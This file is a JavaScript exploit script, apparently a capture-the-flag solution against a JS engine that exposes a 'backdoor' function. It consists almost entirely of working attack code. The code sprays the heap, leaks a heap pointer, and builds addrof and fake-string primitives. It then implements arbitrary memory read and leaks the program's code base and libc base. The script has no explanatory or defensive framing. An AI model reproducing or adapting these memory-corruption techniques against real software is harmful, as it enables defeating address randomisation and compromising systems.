function hex(r){for(var n="",t=0;t<r.length;t++)n+=""+r.charCodeAt(t).toString(16);return n}JRS=function(){function numberToBinString(r,n){for(var t=[],a=null;n--;)a=r%2,t[n]=a,r-=a,r/=2;return t.join("")}function HexFn(r){return parseInt(r,2).toString(16)}function binStringToHexString(r){return r.replace(/(\d{4})/g,HexFn)}function hexStringToBinString(r){for(var n="",t=0;t<r.length-1;t+=2)n+=numberToBinString(parseInt(r.substring(t,t+2),16),8);return n}function SngFwd(r,n,t){var a={};return t=Math.pow(2,23)*t+.5,a.a=255&t,a.b=255&t>>8,a.c=127&t>>16|(1&n)<<7,a.d=r<<7|n>>1,a}function DblFwd(r,n,t){var a={};return t=Math.pow(2,52)*t,a.a=65535&t,a.b=65535&t>>16,t/=Math.pow(2,32),a.c=65535&t,a.d=r<<15|n<<4|15&t>>16,a}function CVTFWD(r,n){var t=null,a=null,o=null,e=null,i="",u={32:{d:127,c:128,b:0,a:0},64:{d:32752,c:0,b:0,a:0}},f={32:8,64:11}[r],g=r-f-1;if(isNaN(n)&&((e=u[r]).a=1,t=!1,a=Math.pow(2,f)-1,o=Math.pow(2,-g)),e||(t=n<0||1/n<0,isFinite(n)||(e=u[r],t&&(e.d+=1<<r/4-1),a=Math.pow(2,f)-1,o=0)),!e){for(a={32:127,64:1023}[r],o=Math.abs(n);o>=2;)a++,o/=2;for(;o<1&&a>0;)a--,o*=2;a<=0&&(o/=2,i="Zero or Denormal"),32==r&&a>254&&(i="Too big for Single",e={d:t?255:127,c:128,b:0,a:0},a=Math.pow(2,f)-1,o=0)}return e||(e={32:SngFwd,64:DblFwd}[r](t,a,o)),e.sgn=+t,e.exp=numberToBinString(a,f),o=o%1*Math.pow(2,g),32==r&&(o=Math.floor(o+.5)),e.mnt=numberToBinString(o,g),e.nb01=i,e}function CVTREV(r){var n={32:8,64:11}[r.length],t=r.match(new RegExp("^(.)(.{"+n+"})(.*)$")),a="1"==t[1]?-1:1;if(!/0/.test(t[2])){var o=/1/.test(t[3])?NaN:a/0;throw new Error("Max Coded "+t[3]+" "+o.toString())}var e=0==+t[2],i=parseInt(t[2],2)-Math.pow(2,n-1)+1;return a*(parseInt(t[3],2)/Math.pow(2,t[3].length)+!e)*Math.pow(2,i+e)}this.doubleToHexString=function(d,size){var NumW=size,Qty=d;with(CVTFWD(NumW,Qty))return binStringToHexString(sgn+exp+mnt)},this.hexStringToDouble=function(r,n){var t=n,a=hexStringToBinString(r);if(new RegExp("^[01]{"+t+"}$").test(a))return CVTREV(a);write(t+" bits 0/1 needed\n")}},jrs=new JRS,gc();for(var i=0;i<7;i++)for(var j=2;j<130;j++)Array(j);str2="BBBBBBBB",obj={};for(var i=0;i<1024;i++)obj["aaaa"+i]="AAAAAAAA";offset1=0x48d,backdoor(str2,offset1);for(var leak=void 0,i=0;i<1024;i++)"AAAAAAAA"!=obj["aaaa"+i]&&(leak=obj["aaaa"+i],obj["aaaa"+i]="AAAAAAAA");var heap_ptr=parseInt(jrs.doubleToHexString(leak,64),16);function addrof(r){for(var n=0;n<1024;n++)obj["aaaa"+n]=r;backdoor(str2,offset1);for(n=0;n<1024;n++)if(obj["aaaa"+n]!=r)return parseInt(jrs.doubleToHexString(obj["aaaa"+n],64),16);return null}write("heap_ptr @ 0x"+heap_ptr.toString(16)+"\n");

// turn an arbitrary address into a string object
function fakestr(addr) {
	var target_double = jrs.hexStringToDouble("0000"+addr.toString(16), 64);
	for(var i=0; i<0x400; i++) {
		obj["aaaa"+i] = target_double
	}
	backdoor(str2, 0x5c5);
	var leak = undefined;
	for(var i=0; i<0x400; i++) {
	  if(obj["aaaa"+i] != target_double) {
		  leak = obj["aaaa"+i];
		  obj["aaaa"+i] = addr;
		  return leak
	  }
	}
	return null;
}

// look for certain marker in the whole memory
var start = heap_ptr - 0x2014;
function look_for(marker, offset) {
	var addr = null;
	for(addr=start+offset; addr<start+0x12000; addr+=0x10) {
		if(fakestr(addr).substring(0, marker.length) == marker) return addr;
	}
	return null;
}

// arbitrary read primitive
function read_hex(addr) {
	var encoded = encodeURI(fakestr(addr));
	var hex_val = "";
	var i = 0;
	while(i<encoded.length) {
		if(encoded[i] == "%") {
			hex_val += encoded.substring(i+1, i+3);
			i+=3;
			continue;
		} else {
			hex_val += hex(encoded[i]);
			i+=1;
			continue;
		}
	}
	return hex_val
}

function leak_ptr(addr) {
	var hex_val = read_hex(addr);
	var res = "";
	for(var i=hex_val.length-2; i>=0; i-=2) {
		res += hex_val.substring(i, i+2);
	}
	return parseInt(res, 16);
}

// leak code base
code_base = leak_ptr(heap_ptr - 0x14) - 0x2311d0;
write("code_base @ 0x"+code_base.toString(16)+'\n');

// leak libc base
libc_base = leak_ptr(code_base + 0x230fd0) - 0x21ab0; // __libc_start_main
write("libc_base @ 0x"+libc_base.toString(16)+'\n');

// clean up heap by filling holes
gc();
str10 = "XXXXXXXXXX";
str20 = str10 + str10;
str40 = str20 + str20;
str80 = str40 + str40;
str100 = str80 + str80;
str200 = str100 + str100;
str400 = str200 + str200;
holder = {}
for(var i=0; i<2000; i++) {
	obj["aaaa"+i] = "str10";
}
gc();
str400 = null;
delete str400
gc();

